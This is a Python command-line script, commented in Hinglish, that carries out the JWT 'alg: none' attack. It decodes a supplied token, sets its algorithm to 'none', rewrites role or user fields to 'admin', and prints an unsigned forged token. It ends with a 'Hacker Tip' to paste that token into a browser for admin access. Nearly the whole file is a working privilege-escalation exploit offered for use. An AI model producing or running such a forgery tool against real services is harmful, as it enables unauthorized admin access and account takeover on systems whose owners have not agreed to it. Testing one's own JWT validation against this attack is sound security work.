import sys
import base64
import json

# Base64 ko theek se decode karne ke liye padding fix karni padti hai
def add_padding(b64_string):
    return b64_string + "=" * (-len(b64_string) % 4)

def hack_jwt(token):
    print(f"\n[*] Bhai, analyzing and decoding your JWT...")
    
    parts = token.split('.')
    if len(parts) != 3:
        print("[-] Arre yaar, yeh valid JWT nahi lag raha. Isme 3 parts (dots) hone chahiye.")
        return

    try:
        # Step 1: Extract and Decode
        header = json.loads(base64.urlsafe_b64decode(add_padding(parts[0])).decode('utf-8'))
        payload = json.loads(base64.urlsafe_b64decode(add_padding(parts[1])).decode('utf-8'))
        
        print("\n--- ORIGINAL TOKEN DATA ---")
        print("[*] Header:", json.dumps(header, indent=2))
        print("[*] Payload:", json.dumps(payload, indent=2))
        
        # Step 2: The Hacker Forgery (Algorithm 'None' Attack)
        print("\n--------------------------------------------------")
        print("[*] Initiating Privilege Escalation Attack...")
        print("[*] Modifying Header Algorithm to 'none'...")
        header['alg'] = 'none'
        
        print("[*] Modifying Payload to inject Admin privileges...")
        # Automatically guess karke admin role set karne ki koshish
        if 'role' in payload:
            payload['role'] = 'admin'
        elif 'user' in payload:
            payload['user'] = 'admin'
        else:
            payload['admin'] = True
            
        # Step 3: Re-encode the forged token
        new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        
        # Notice: Aakhri mein ek dot (.) hai par uske baad koi signature nahi hai!
        forged_token = f"{new_header}.{new_payload}."
        
        print(f"\n[+] BOOM! 🎯 Forged Admin Token Generated (No Signature):\n")
        print(f"{forged_token}\n")
        print("[*] Hacker Tip: Apne browser mein jao, purana token hatao aur yeh paste karke page refresh karo!")
        print("--------------------------------------------------")

    except Exception as e:
        print(f"[-] Error decoding token: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 jwt_tool.py <your_jwt_token>")
        print("Example: python3 jwt_tool.py eyJhbGciOiJIUzI1Ni... (Paste your token here)")
        sys.exit(1)
        
    target_token = sys.argv[1]
    hack_jwt(target_token)
